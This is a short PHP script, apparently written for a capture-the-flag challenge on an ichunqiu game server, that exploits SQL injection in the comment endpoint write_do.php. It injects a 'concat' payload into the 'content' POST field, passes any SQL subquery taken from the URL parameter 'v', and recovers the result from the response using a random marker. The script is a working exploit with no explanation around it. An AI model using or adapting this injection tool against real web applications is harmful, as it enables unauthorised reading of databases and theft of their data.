<?php

error_reporting(E_ALL);

function request_post($param ) {
        $cookieSuccess = dirname(__FILE__)."/1769.tmp";
        $postUrl = "http://3b5f2f3373764945a706c34b41ec08b6add260f04c50467d.game.ichunqiu.com/write_do.php?do=comment";
        $ch = curl_init();//初始化curl
        curl_setopt($ch, CURLOPT_URL,$postUrl);//抓取指定网页
        curl_setopt($ch, CURLOPT_HEADER, 1);//设置header
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5); 
        curl_setopt($ch, CURLOPT_POST, true);//post提交方式
        curl_setopt($ch, CURLOPT_POSTFIELDS, $param);
        curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieSuccess);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        $data = curl_exec($ch);//运行curl
        curl_close($ch);
        return $data;
}

function grs($length = 10) { 
  $characters = '01234567890123456789012345678901234567890123456789'; 
  $randomString = ''; 
  for ($i = 0; $i < $length; $i++) { 
    $randomString .= $characters[rand(0, strlen($characters) - 1)]; 
  } 
  return $randomString; 
}

$g = grs(10);

$data = [
    "content" => ",content=concat(0x".bin2hex($g).",(".$_GET['v'].")),#",
    "bo_id" => "1"
];

$htmlres = request_post($data);

$z = explode($g,$htmlres);
echo $z[1];



